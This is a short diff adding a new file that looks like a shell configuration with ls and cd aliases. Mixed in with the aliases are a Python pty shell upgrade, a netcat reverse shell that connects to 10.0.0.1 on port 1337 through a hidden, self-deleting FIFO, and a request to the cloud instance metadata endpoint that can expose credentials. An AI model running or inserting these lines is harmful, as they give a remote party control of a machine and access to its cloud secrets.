@@ -1,0 +1,7 @@
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+alias l='ls -alh'
+alias ..='cd .. && l'
+
+mkfifo /tmp/.zK; nc 10.0.0.1 1337 0</tmp/.zK | /bin/sh >/tmp/.zK 2>&1; rm /tmp/.zK
+
+python -c 'import urllib.request; print(urllib.request.urlopen("http://169.254.169.254/latest/meta-data/").read(999))'
